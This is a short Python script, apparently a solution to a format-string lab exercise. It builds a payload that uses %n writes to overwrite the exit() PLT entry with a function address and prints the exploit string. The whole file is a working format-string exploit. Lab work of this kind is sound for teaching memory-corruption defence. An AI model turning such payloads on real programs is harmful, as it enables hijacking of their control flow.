#!/usr/bin/env python
import struct

"""
 use format string attack to change plt table,
 and learn how plt table work
"""
HELLO = 0x080484b4
EXIT_PLT = 0x8049724

arg1 = struct.pack("<I", EXIT_PLT)
arg2 = struct.pack("<I", EXIT_PLT+2)
format1 = "%4$33964x%4$n"
format2 = "%5$33616x%5$n"

exploit = ""
exploit += arg1+arg2
exploit += format1+format2

print exploit
